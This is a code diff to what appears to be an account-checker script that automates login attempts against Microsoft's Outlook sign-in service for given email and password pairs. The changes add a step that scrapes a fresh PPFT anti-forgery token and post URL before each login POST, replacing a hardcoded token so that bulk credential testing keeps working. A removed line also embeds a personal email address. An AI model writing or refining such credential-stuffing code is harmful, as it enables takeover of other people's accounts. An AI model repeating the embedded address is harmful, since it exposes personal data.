@@ -212,7 +212,7 @@ const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 2000;
 
-const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";
+const AUTHORIZE_URL = "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch";
 
 const LOGIN_HEADERS = {
   "Host": "login.live.com",
@@ -361,11 +361,30 @@ async function attemptCheck(email, password) {
   const cookieJar = createCookieJar();
 
   try {
-    // ── Step 1: Login ──
+    // ── Step 0: Pre-auth GET to get fresh PPFT + cookies ──
+    const preAuthResp = await sessionFetch(AUTHORIZE_URL, {
+      method: "GET",
+      headers: { ...LOGIN_HEADERS },
+      signal: AbortSignal.timeout(15000),
+    }, cookieJar);
+
+    const preAuthBody = await preAuthResp.text();
+    const ppft = parseLR(preAuthBody, 'name="PPFT" id="i0327" value="', '"')
+              || parseLR(preAuthBody, "sFT:'", "'")
+              || parseLR(preAuthBody, 'value="', '"');
+    const urlPost = parseLR(preAuthBody, "urlPost:'", "'");
+
+    if (!ppft || !urlPost) {
+      result.status = "retry";
+      result.detail = "no PPFT/urlPost from pre-auth";
+      return result;
+    }
+
+    // ── Step 1: Login POST with fresh PPFT ──
     const postData = new URLSearchParams({
       ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
       canary: "", ctx: "", hpgrequestid: "",
-      PPFT: "-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR%21JjAUTPM*Am5lkZU6Sa%21wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ%21EynMuuBHbBfLr28btqCBqLhzZXQ%24%24",
+      PPFT: ppft,
       PPSX: "Pa", NewUser: "1", FoundMSAs: "",
       fspost: "0", i21: "0", CookieDisclosure: "0",
       IsFidoSupported: "1", isSignupPost: "0", isRecoveryAttemptPost: "0",
@@ -374,7 +393,7 @@ async function attemptCheck(email, password) {
       hisRegion: "", hisScaleUnit: "", passwd: password,
     });
 
-    const resp = await sessionFetch(LOGIN_URL, {
+    const resp = await sessionFetch(urlPost, {
       method: "POST",
       headers: { ...LOGIN_HEADERS },
       body: postData.toString(),
